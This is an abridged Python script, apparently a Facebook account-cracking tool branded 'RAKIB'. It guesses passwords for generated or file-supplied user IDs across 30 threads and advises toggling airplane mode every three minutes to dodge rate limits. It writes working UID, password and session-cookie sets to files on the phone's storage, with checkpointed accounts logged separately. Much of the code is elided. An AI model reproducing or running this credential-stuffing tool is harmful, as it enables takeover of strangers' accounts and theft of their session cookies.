...
{G1}[{A}={G1}]{G1}VERSION {R} :{A} 0{G1}𒊹︎︎︎{A}23
{A}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")
...
def menu():
    ...
    if sex in ['1']:
        ...
        os.system('xdg-open https://www.facebook.com/RAKIB.999.CYBER?mibextid=vk8aRt');menu()
    elif sex in ['0']:
        sys.exit()
    else:
        menu()
...
def bd():
    ...
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'            {R}[{G1}METHOD{R}𒊹︎︎︎{G1}BD UID{R}]{G1}');linex()
...
def India():
    ...
    with ThreadPool(max_workers=30) as sexy:
        clear()
        print(f'            {R}[{G1}METHOD{R}𒊹︎︎︎{G1}IND UID{R}]{G1}');linex()
        print(f'{G1}[{A}={G1}]{G1} SIM CODE  {A}➢{A} {code}')
        print(f'{G1}[{A}={G1}]{G1} TOTAL UID {A}➢{A} {str(len(user))}')
        print(f"{G1}[{A}={G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for love in user:
...
def file():
    ...
    with ThreadPool(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f'            {R}[{G1}METHOD{R}𒊹︎︎︎{G1}FILE UID{R}]{G1}');linex()
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}RAKIB{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}RAKIB-OK💚{A}]{G1} {uid} {R}𒊹︎︎︎{G1} {pas}');open('/sdcard/RAKIB-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}RAKIB-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
    ...
    try:
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}RAKIB-OK💚{A}]{G1} {ids} {R}𒊹︎︎︎{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/RAKIB-FILE-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                #print(f'\r\r{A}[{M}SWAG-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/RAKIB-FILE-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
